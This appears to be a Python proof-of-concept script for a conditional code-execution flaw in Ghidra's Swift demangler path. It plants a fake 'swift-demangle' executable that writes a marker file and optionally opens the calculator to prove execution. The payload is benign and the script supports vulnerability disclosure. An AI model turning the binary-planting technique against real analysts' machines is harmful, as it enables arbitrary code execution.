#!/usr/bin/env python3
import argparse
import platform
import subprocess
from pathlib import Path

from calc_helper import launch_calc, make_executable, shell_script_header, write_marker


def default_out_dir() -> Path:
    return Path(__file__).resolve().parent.parent / "artifacts" / "swift-demangler-calc"


def fake_demangler_name() -> str:
    return "swift-demangle.cmd" if platform.system().lower() == "windows" else "swift-demangle"


def build_fake_demangler(fake_demangler: Path, marker: Path, no_calc: bool) -> None:
    lines = [shell_script_header()]
    if platform.system().lower() == "windows":
        lines.extend(
            [
                "echo Swift demangler calc PoC 1.0\n",
                f'echo ran with: %* > "{marker}"\n',
            ]
        )
    else:
        lines.extend(
            [
                "echo 'Swift demangler calc PoC 1.0'\n",
                f'printf "ran with: %s\\n" "$*" > "{marker}"\n',
            ]
        )
    fake_demangler.write_text("".join(lines), encoding="utf-8")
    make_executable(fake_demangler)
    if no_calc:
        return


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Conditional Ghidra Swift demangler path ACE calc PoC."
    )
    parser.add_argument("--run", action="store_true", help="execute the fake demangler")
    parser.add_argument("--no-calc", action="store_true", help="create marker only")
    parser.add_argument("--out-dir", type=Path, default=default_out_dir())
    args = parser.parse_args()

    out_dir = args.out_dir.resolve()
    fake_swift_dir = out_dir / "fake-swift-bin"
    fake_swift_dir.mkdir(parents=True, exist_ok=True)
    marker = out_dir / "swift_demangler_calc_marker.txt"
    fake_demangler = fake_swift_dir / fake_demangler_name()

    build_fake_demangler(fake_demangler, marker, args.no_calc)

    print("Purpose: conditional Swift demangler path ACE calc PoC.")
    print(f"Fake Swift binary directory: {fake_swift_dir}")
    print(f"Fake demangler: {fake_demangler}")
    print(f"Marker file: {marker}")
    print("Simulated Ghidra command shape: swift-demangle --version")
    print("Classification: conditional ACE, not default/open-only RCE.")

    if not args.run:
        print("Dry run only. Re-run with --run to execute the fake demangler.")
        print("Use --no-calc with --run to create only the marker file.")
        return 0

    subprocess.run([str(fake_demangler), "--version"], check=True)
    if not marker.exists():
        raise RuntimeError("Expected marker was not created")

    if args.no_calc:
        print("Calc launch disabled by --no-calc.")
    else:
        launched = launch_calc()
        if launched:
            print("Local calculator launch requested.")
        else:
            print("No platform calculator command was found; marker proves execution.")

    print(f"[created] {marker}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
